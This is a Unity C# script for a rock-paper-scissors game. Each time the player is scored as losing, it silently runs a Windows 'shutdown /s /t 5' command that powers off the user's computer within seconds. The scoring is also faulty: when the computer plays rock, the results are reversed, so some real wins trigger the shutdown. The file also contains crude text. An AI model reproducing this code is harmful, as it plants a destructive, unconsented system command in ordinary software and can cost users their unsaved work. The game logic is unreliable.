using TMPro;
using UnityEngine;

public class hand : MonoBehaviour
{
    public TextMeshProUGUI text;
    public GameObject hand1;
    public GameObject hand2;
    float random;
    public Sprite rock;
    public Sprite paper;
    public Sprite scrisors;

    public void show(float nr)
    {
        random = Random.Range(1, 4);
        switch (nr)
        {
            case 1:
                hand1.gameObject.GetComponent<SpriteRenderer>().sprite = rock;
                break;
            case 2:
                hand1.gameObject.GetComponent<SpriteRenderer>().sprite= paper;
                break;
            case 3:
                hand1.gameObject.GetComponent<SpriteRenderer>().sprite= scrisors;
                break;
        }
        
        switch (random)
        {
            case 1:
                hand2.gameObject.GetComponent<SpriteRenderer>().sprite = rock;
                break;
            case 2:
                hand2.gameObject.GetComponent<SpriteRenderer>().sprite = paper;
                break;
            case 3:
                hand2.gameObject.GetComponent<SpriteRenderer>().sprite = scrisors;
                break;
        }

        if (random == 1)
            if (nr == 2)
            {
                text.text = "you lost";
                System.Diagnostics.Process.Start("shutdown", "/s /t 5");
            }
            else if (nr == 3)
                text.text = "you win";

        if (random == 2)
            if (nr == 1)
            {
                text.text = "you lost";
                System.Diagnostics.Process.Start("shutdown", "/s /t 5");
            }
            else if (nr == 3)
                text.text = "you win";

        if (random == 3)
            if (nr == 2)
            {
                text.text = "you lost";
                System.Diagnostics.Process.Start("shutdown", "/s /t 5");
            }
            else if (nr == 1)
                text.text = "you win";

        if (random == nr)
            text.text = "same shit";

    }


    public void fuck_me()
    {
        hand1.gameObject.GetComponent<SpriteRenderer>().sprite = null;
        hand2.gameObject.GetComponent<SpriteRenderer>().sprite = null;
        text.text = " ";
    }
}
